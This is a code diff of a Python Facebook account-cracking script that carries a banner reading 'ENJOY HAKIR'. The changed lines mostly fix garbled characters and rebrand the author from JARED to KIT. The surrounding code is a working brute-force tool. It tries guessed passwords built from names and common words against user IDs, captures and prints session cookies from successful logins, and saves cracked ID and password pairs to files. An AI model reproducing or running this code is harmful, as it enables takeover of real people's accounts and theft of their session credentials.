@@ -57,7 +57,7 @@ def login():
 		except requests.exceptions.ConnectionError:
 			clear()
 			print(logo)
-			print ( ' [Ã—] Connection Timeout')
+			print ( ' [×] Connection Timeout')
 			exit()
 	except IOError:
 		menu()
@@ -152,12 +152,14 @@ cps=[]
 ## = input(' Put Your Network Name: ')
 logo =f"""\x1b[1;97m
 
-\33[1;32mâ–‘â–‘â–‘â–‘â–‘â–ˆâ–ˆâ•—â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘
-\33[1;32mâ–‘â–‘â–‘â–‘â–‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—
-\33[1;32mâ–‘â–‘â–‘â–‘â–‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–‘â–ˆâ–ˆâ•‘â–‘â–‘â–ˆâ–ˆâ•‘
-\33[1;32mâ–ˆâ–ˆâ•—â–‘â–‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â–‘â–‘â–ˆâ–ˆâ•‘â–‘â–‘â–ˆâ–ˆâ•‘
-\33[1;32mâ•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–‘â–‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–‘â–‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•
-\33[1;32mâ–‘â•šâ•â•â•â•â•â–‘â•šâ•â•â–‘â–‘â•šâ•â•â•šâ•â•â–‘â–‘â•šâ•â•â•šâ•â•â•â•â•â•â•â•šâ•â•â•â•â•â•â–‘
+\33[1;32m██╗░░██╗██╗████████╗
+\33[1;32m██║░██╔╝██║╚══██╔══╝
+\33[1;32m█████═╝░██║░░░██║░░░
+\33[1;32m██╔═██╗░██║░░░██║░░░
+\33[1;32m██║░╚██╗██║░░░██║░░░
+\33[1;32m╚═╝░░╚═╝╚═╝░░░╚═╝░░░
+
+
                                    
 
                                                       
@@ -165,10 +167,10 @@ logo =f"""\x1b[1;97m
 \033[1;36m["ENJOY HAKIR"]
   
 ------------------------------------------------------------------------
-\33[1;36m á´€á´œá´›Êœá´Ê€    : JARED
-\33[1;36m á´ á´‡Ê€sÉªá´É´    : 0.01
-\33[1;36m Ò“á´€á´„á´‡Ê™á´á´á´‹  : JARED
-\33[1;36m á´›á´á´ÊŸ sá´›á´€á´›á´œs : Ò“Ê€á´‡á´‡
+\33[1;36m ᴀᴜᴛʜᴏʀ    : KIT
+\33[1;36m ᴠᴇʀsɪᴏɴ    : 0.01
+\33[1;36m ғᴀᴄᴇʙᴏᴏᴋ  : KIT
+\33[1;36m ᴛᴏᴏʟ sᴛᴀᴛᴜs : FREE
 ------------------------------------------------------------------------"""
 
 def clear():
@@ -211,7 +213,7 @@ def x2():
 
 def menu_apikey():
   uuid = str(os.geteuid()) + str(os.getlogin())
-  id ='Its-JARED' +'â†’'.join(uuid)+str(os.getlogin())
+  id ='Its-JARED' +'→'.join(uuid)+str(os.getlogin())
   server = requests.get(f'https://github.com/Raki-404/Aprobel-JARED/blob/main/A.txt')
   x1()
   x2()
@@ -312,7 +314,7 @@ def menu():
 	elif opt =='0':
 		menu()
 	else:
-		print('\033[1;91m [â€¢] Choose valid option\033[0;97m')
+		print('\033[1;91m [•] Choose valid option\033[0;97m')
 def vx():
 	clear()
 	print(' [1] RANDOM METHOD (1)')
@@ -356,7 +358,7 @@ def gml():
 			#pwx = ['123890',uid,ko+kod,ko+kod+kode,uid[5:],uid[3:],uid[4:],'Bangladesg','bangladesh','i love you','bangla','Bangla','@#@#@#','@@@###','###@@@','free fire']
 			yaari.submit(mumit2,uid,pwx,tl)
 	print(47*"\n\033[1;37m-")
-	print('[âœ“] Crack process has been completed')
+	print('[✓] Crack process has been completed')
 	print('[?] Total Ok Id Save in  /sdcard/JARED-OK.txt')
 	print('[?] Total Cp Id Save in  /sdcard/JARED-CP.txt')
 	print(47*"-")
@@ -371,7 +373,7 @@ def cek_apk(session,coki):
     if len(game)==0:
         print('\r\x1b[38;5;46m[\x1b[38;5;196m!\x1b[38;5;46m] \033[1;93mSorry there is no Active  Apk')
     else:
-        print('\r[ðŸŽ®] \033[1;92m â˜† Your Active Apps â˜† \033[1;91m: \033[1;96m')
+        print('\r[🎮] \033[1;92m ☆ Your Active Apps ☆ \033[1;91m: \033[1;96m')
         for i in range(len(game)):
             print("\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
             
@@ -382,7 +384,7 @@ def cek_apk(session,coki):
     if len(game)==0:
         print('\r\033[1;92m[+]\033[1;91m Sorry there is no Expired Apk')
     else:
-        print('\r[ðŸŽ®] \033[1;96m â—‡ Your Expired Apps â—‡ \033[1;91m: \033[1;92m')
+        print('\r[🎮] \033[1;96m ◇ Your Expired Apps ◇ \033[1;91m: \033[1;92m')
         for i in range(len(game)):
             print("\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
         else:
@@ -558,7 +560,7 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print('\r\r\033[1;32m[JARED-OK] \033[1;32m'+uid+'\033[1;32m â€¢ \033[1;32m' +ps+    '  \n[â€Žâ€ŽðŸª]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+                print('\r\r\033[1;32m[JARED-OK] \033[1;32m'+uid+'\033[1;32m • \033[1;32m' +ps+    '  \n[‎‎🍪]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                 open('/sdcard/DENV-OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(cid)
                 cek_apk(session,coki)
@@ -566,7 +568,7 @@ def rcrack(uid,pwx,tl):
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
-                print('\r\r\x1b[1;36m [JARED-CP] ' +cid+ ' â€¢ ' +ps+           '  \33[0;97m')
+                print('\r\r\x1b[1;36m [JARED-CP] ' +cid+ ' • ' +ps+           '  \33[0;97m')
                 open('/sdcard/JARED-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
@@ -723,7 +725,7 @@ def ffb1(ids,names,passlist):
         except:
             ln=fn
         for pw in passlist:
-            sys.stdout.write('\r\r\033[1;36m [JARED-CRACKING-VIP] %s| \033[1;32mALIVE\033[0mâ•‘â•‘\033[1;31mDEAD \033[1;32m%s\033[0mâ•‘â•‘\033[1;31m%s'%(loop,len(oks),len(cps)));sys.stdout.flush()
+            sys.stdout.write('\r\r\033[1;36m [JARED-CRACKING-VIP] %s| \033[1;32mALIVE\033[0m║║\033[1;31mDEAD \033[1;32m%s\033[0m║║\033[1;31m%s'%(loop,len(oks),len(cps)));sys.stdout.flush()
             pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
             data={
               'adid': f'{uuid.uuid4()}', 
